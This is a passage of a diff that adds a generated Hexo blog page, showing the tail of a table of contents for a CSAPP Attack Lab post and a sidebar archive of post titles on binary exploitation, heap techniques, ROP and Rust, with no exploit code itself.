class="toc-text">Lv5: 用Gadget调用touch3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结:</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 23
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/04</span>
+            <a class="archive-post-title" href="/2024/07/04/CSAPP-Labs%E2%80%94%E2%80%94Attack-Lab/">CSAPP Labs——Attack Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span>
+            <a class="archive-post-title" href="/2024/06/06/CSAPP-Labs%E2%80%94%E2%80%94Bomb-Lab/">CSAPP Labs——Bomb Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/05</span>
+            <a class="archive-post-title" href="/2024/06/05/CSAPP-Labs%E2%80%94%E2%80%94Data-Lab/">CSAPP Labs——Data Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span>
+            <a class="archive-post-title" href="/2024/05/13/%E7%94%B5%E8%84%91%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E6%95%B4%E7%90%86/">电脑问题解决方案整理</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span>
+            <a class="archive-post-title" href="/2024/04/17/How2Heap-6/">How2Heap(6)——House of Roman & House of Rabbit</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span>
+            <a class="archive-post-title" href="/2024/04/06/%E5%88%86%E4%BA%AB%E4%BC%9A/">分享会</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span>
+            <a class="archive-post-title" href="/2024/03/23/%E6%A0%88%E6%BA%A2%E5%87%BAROP%E7%86%9F%E7%BB%83%E5%BA%A6%E6%8F%90%E5%8D%87tips/">栈溢出ROP熟练度提升tips</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/05</span>
+            <a class="archive-post-title" href="/2024/02/05/Rust-Rust-3/">Rust？Rust！(3)——自用整合终极版</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span>
+            <a class="archive-post-title" href="/2024/01/25/How2Heap-5/">How2Heap(5)——Unsorted bin attack & House of Lore</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span>
+            <a class="archive-post-title" href="/2024/01/23/%E5%93%88%E5%B7%A5%E5%A4%A7%E9%9D%92%E8%AE%AD%E8%90%A5%E8%AE%B0%E5%BD%95%E6%95%B4%E5%90%88%E5%8C%85/">青训营记录整合包</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span>
+            <a class="archive-post-title" href="/2024/01/22/IO-FILE/">IO_FILE——File Stream Oriented Programming (1)</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span>
+            <a class="archive-post-title" href="/2023/12/30/How2Heap-4/">How2Heap(4)——House of Orange & House of Einhejar</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span>
+            <a class="archive-post-title" href="/2023/12/27/ubuntu16-04-docker-%E5%AE%89%E8%A3%85pwndbg%E8%B8%A9%E5%9D%91%E5%A4%A7%E5%85%A8/">ubuntu16.04 docker环境踩坑</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/26</span>
+            <a class="archive-post-title" href="/2023/12/26/Rust-Rust-2/">Rust？Rust！(2)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/17</span>
+            <a class="archive-post-title" href="/2023/12/17/How2Heap-3/">How2Heap(3)—House of Force & House of Gods.</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/14</span>
+            <a class="archive-post-title" href="/2023/12/14/Rust%EF%BC%9FRust%EF%BC%81-1/">Rust？Rust！(1)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/03</span>
+            <a class="archive-post-title" href="/2023/12/03/How2Heap-2/">How2Heap(2)-Overlapping</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2023/11/25/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">linux杂谈（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2023/11/25/%E9%80%86%E5%90%91%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">逆向杂谈（持续更新）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2023/11/09/How2Heap-1/">How2Heap(1)-fastbin（完整版）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span>
+            <a class="archive-post-title" href="/2023/11/06/%E5%AF%B9%E8%B7%B3%E8%A1%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E9%9D%99%E6%80%81%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/">对跳表机制及其静态逆向的一些想法</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span>
+            <a class="archive-post-title" href="/2023/10/26/pwntools%E7%9A%84shellcode%E9%80%BB%E8%BE%91%E8%AF%A6%E8%A7%A3/">pwntools的shellcode逻辑详解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span>
+            <a class="archive-post-title" href="/2023/10/26/my-first-blog/">my_first_blog</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="CSAPP">
+                <span class="iconfont-archer">&#xe606;</span>
+                CSAPP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Lab">
+                <span class="iconfont-archer">&#xe606;</span>
+                Lab
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="逆向">
+                <span class="iconfont-archer">&#xe606;</span>
+                逆向
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="heap">
+                <span class="iconfont-archer">&#xe606;</span>
+                heap
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="FSOP">
+                <span class="iconfont-archer">&#xe606;</span>
+                FSOP
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Develop">
+                <span class="iconfont-archer">&#xe606;</span>
+                Develop
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Rust">
+                <span class="iconfont-archer">&#xe606;</span>
+                Rust
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="linux">
+                <span class="iconfont-archer">&#xe606;</span>
+                linux
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="shellcode">
+                <span class="iconfont-archer">&#xe606;</span>
+                shellcode
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Others">
+                <span class="iconfont-archer">&#xe606;</span>
+                Others
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="IDA">
+                <span class="iconfont-archer">&#xe606;</span>
+                IDA
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="编译">
+                <span class="iconfont-archer">&#xe606;</span>
+                编译
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ROP">
+                <span class="iconfont-archer">&#xe606;</span>
+                ROP
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="CSAPP">
+            <span class="iconfont-archer">&#xe60a;</span>
+            CSAPP
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="pwn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            pwn
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Develop">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Develop
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="linux">
+            <span class="iconfont-archer">&#xe60a;</span>
+            linux
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="others">
+            <span class="iconfont-archer">&#xe60a;</span>
+            others
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="Reverse">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Reverse
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="pwn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            pwn
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
